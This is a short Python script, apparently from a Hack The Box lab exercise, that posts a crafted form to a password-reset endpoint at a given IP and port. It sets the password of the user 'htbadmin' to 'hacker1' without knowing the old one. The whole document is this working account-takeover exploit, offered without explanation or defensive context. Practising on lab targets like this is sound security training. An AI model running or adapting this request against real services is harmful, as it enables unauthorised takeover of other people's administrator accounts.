import requests

url = "http://94.237.53.115:30802/"  # Replace with the actual reset password request URL
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# Fill in your packet parameters
data = {
    "oldpasswd": "hacker1", 
    "newpasswd": "hacker1",
    "confirm": "hacker1",
    "userid": "htbadmin",
    "submit": "doreset"
}

response = requests.post(url, headers=headers, data=data)

# Check if the response is successful
if response.status_code == 200:
    print("Password reset successful！")
else:
    print(f"Password reset failed. Response status code：{response.status_code}")
